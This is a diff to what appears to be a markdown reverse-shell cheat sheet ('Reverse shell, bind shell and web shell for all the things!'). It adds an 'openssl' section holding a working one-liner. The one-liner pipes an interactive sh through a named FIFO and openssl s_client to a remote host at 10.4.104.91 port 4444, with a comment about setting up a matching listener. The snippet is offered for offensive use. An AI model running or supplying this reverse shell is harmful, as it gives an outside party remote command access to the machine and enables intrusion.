@@ -1,4 +1,12 @@
 Reverse shell, bind shell and web shell for all the things!
+
+# openssl
+```sh
+
+change the listener to openssl listener from reverse shell generator then enter enter enter#attack
+mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.4.104.91:4444 > /tmp/s; rm /tmp/s #server
+```
+
 # Bash
 
 ```bash
